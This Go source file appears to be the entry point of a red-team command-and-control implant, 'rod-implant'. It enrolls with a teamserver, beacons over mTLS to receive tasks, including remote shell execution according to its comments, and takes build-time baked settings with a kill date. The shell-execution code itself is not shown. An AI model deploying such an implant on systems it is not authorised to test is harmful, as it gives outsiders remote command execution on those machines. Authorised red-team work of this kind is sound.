// Command rod-implant is the reference Go stage-2 implant (roadmap M3.2). It
// enrolls into an engagement, opens the mTLS beacon stream, and runs the core
// capability verbs the teamserver dispatches (architecture.md Sec 5).
//
// This is a benign reference implant: it enrolls over the teamserver's HTTP
// enroll endpoint, beacons over mTLS, and shells out for the single core verb
// shell.exec. It performs no evasion, no obfuscation, no persistence, and no
// destructive behavior (RESPONSIBLE-USE.md, architecture.md Sec 7). It exists to
// prove the end-to-end slice -- enroll, beacon, task -- against the real
// teamserver and to give the Go build unit something real to compile.
package main

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"errors"
	"log"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/cw/rod/implant/internal/beacon"
	"github.com/cw/rod/implant/internal/c2"
	"github.com/cw/rod/implant/internal/config"
)

func main() {
	// A profile baked in at build time (ldflags) seeds the defaults; explicit
	// flags and env still win over it, so an operator can override at run time.
	seedFromBaked();
	cfg, err := config.Parse(os.Args[1:])
	if err != nil {
		// A flag parse error or -h has already been reported by the flag set.
		os.Exit(2)
	}
	logger := log.New(os.Stderr, "rod-implant: ", log.LstdFlags|log.Lmsgprefix)

	if !cfg.KillDate.IsZero() && time.Now().After(cfg.KillDate) {
		logger.Fatalf("kill date %s has passed; refusing to run", cfg.KillDate.Format(time.RFC3339))
	}

	// The implant owns its private key; only the public half crosses enroll
	// (architecture.md Sec 9). 2048-bit RSA matches the dev CA's leaf key size.
	logger.Print("generating implant keypair")
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		logger.Fatalf("generate key: %v", err)
	}

	serverCAs, err := loadCAs(cfg.CACertPEM)
	if err != nil {
		logger.Fatalf("load CA: %v", err)
	}

	logger.Printf("enrolling at %s", cfg.EnrollURL)
	enrollment, err := c2.Enroll(cfg.EnrollURL, cfg.StagerToken, privateKey, serverCAs)
	if err != nil {
		logger.Fatalf("enroll: %v", err)
	}
	logger.Printf("enrolled: implant=%s engagement=%s", enrollment.ImplantID, enrollment.EngagementID)

	beaconURL := cfg.BeaconURL
	if beaconURL == "" {
		beaconURL = beaconURLFromEnroll(cfg.EnrollURL)
	}

	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer cancel()

	b := beacon.New(beaconURL, enrollment.ImplantID, enrollment.Leaf, enrollment.CAs, cfg.Sleep, cfg.Jitter, logger)
	if err := b.Run(ctx); err != nil && !errors.Is(err, context.Canceled) {
		logger.Fatalf("beacon: %v", err)
	}
}

// loadCAs parses an optional PEM-encoded CA bundle the implant pins as the
// teamserver identity. An empty path returns a nil pool (system roots / trust
// the chain returned at enroll).
func loadCAs(pemCert string) (*x509.CertPool, error) {
	if pemCert == "" {
		return nil, nil
	}
	block, _ := pem.Decode([]byte(pemCert))
	if block == nil {
		return nil, errors.New("CA cert is not valid PEM")
	}
	cert, err := x509.ParseCertificate(block.Bytes)
	if err != nil {
		return nil, err
	}
	pool := x509.NewCertPool()
	pool.AddCert(cert)
	return pool, nil
}

// beaconURLFromEnroll derives the beacon URL (host:port) from the enroll URL by
// stripping the /implants/enroll path. Lets the operator pass a single endpoint.
func beaconURLFromEnroll(enrollURL string) string {
	u := enrollURL
	for _, suffix := range []string{"/implants/enroll", "/implants/enroll/"} {
		if len(u) >= len(suffix) && u[len(u)-len(suffix):] == suffix {
			u = u[:len(u)-len(suffix)]
			break
		}
	}
	return u
}


// seedFromBaked applies the build-time baked profile as the defaults for any
// config field the operator did not supply via flag or env. The baked value is
// base64-URL JSON (the build unit sets it via ldflags). Malformed baked data is
// ignored -- a bad bake must not crash the implant, it just falls back to
// flag/env.
func seedFromBaked() {
	if bakedJSON == "" {
		return
	}
	raw, err := base64.URLEncoding.DecodeString(bakedJSON)
	if err != nil {
		raw, err = base64.StdEncoding.DecodeString(bakedJSON)
		if err != nil {
			return
		}
	}
	var baked map[string]string
	if err := json.Unmarshal(raw, &baked); err != nil {
		return
	}
	// Map baked keys to the same ROD_* env names config.Parse reads; only set env
	// when it is not already present, so an explicit env always wins over the bake.
	envMap := map[string]string{
		"enrollURL": "ROD_ENROLL_URL",
		"beaconURL": "ROD_BEACON_URL",
		"token":     "ROD_STAGER_TOKEN",
		"sleep":     "ROD_SLEEP",
		"jitter":    "ROD_JITTER",
		"killDate":  "ROD_KILL_DATE",
	}
	for jsonKey, envKey := range envMap {
		if v, ok := baked[jsonKey]; ok && v != "" && os.Getenv(envKey) == "" {
			os.Setenv(envKey, v)
		}
	}
}
